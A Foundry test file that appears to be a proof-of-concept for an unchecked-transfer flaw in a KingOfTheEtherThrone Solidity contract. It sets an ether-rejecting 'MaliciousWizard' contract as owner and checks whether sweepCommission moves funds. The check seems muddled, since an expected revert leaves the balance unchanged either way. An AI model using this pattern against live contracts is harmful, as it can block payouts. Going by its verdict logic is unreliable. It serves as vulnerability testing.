// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/king_of_the_ether_throne.sol";

contract MaliciousWizard {
    fallback() external payable {
        revert("Malicious wizard rejects ether");
    }
}

contract UncheckedTransferTest is Test {
    KingOfTheEtherThrone throne;
    address initialWizard = address(0x123);
    MaliciousWizard maliciousWizard;
    address user = address(0x456);

    function setUp() public {
        vm.deal(initialWizard, 10 ether);
        vm.prank(initialWizard);
        throne = new KingOfTheEtherThrone();
        
        // Fund the throne contract
        vm.deal(address(throne), 5 ether);
        
        // Deploy malicious wizard contract
        maliciousWizard = new MaliciousWizard();
    }

    function testUncheckedTransferVulnerability() public {
        // Transfer ownership to malicious wizard
        vm.prank(initialWizard);
        throne.transferOwnership(address(maliciousWizard));
        
        console2.log("--- BEFORE-Trigger sweepCommission ---");
        uint256 beforeBalance = address(throne).balance;
        console2.log("Contract balance: %e", beforeBalance);

        console2.log("--- Trigger sweepCommission ---");
        vm.prank(address(maliciousWizard));
        vm.expectRevert();
        throne.sweepCommission(1 ether);

        console2.log("--- AFTER-Trigger sweepCommission ---");
        uint256 afterBalance = address(throne).balance;
        console2.log("Contract balance: %e", afterBalance);
        
        console2.log("--- Balance Verification ---");
        if (afterBalance == beforeBalance) {
            console2.log("State change: No balance difference");
            console2.log("Final verdict: Vulnerability Exists");
        } else {
            console2.log("State change: Balance changed by %d wei", beforeBalance - afterBalance);
            console2.log("Final verdict: Vulnerability not Exist");
        }
    }
}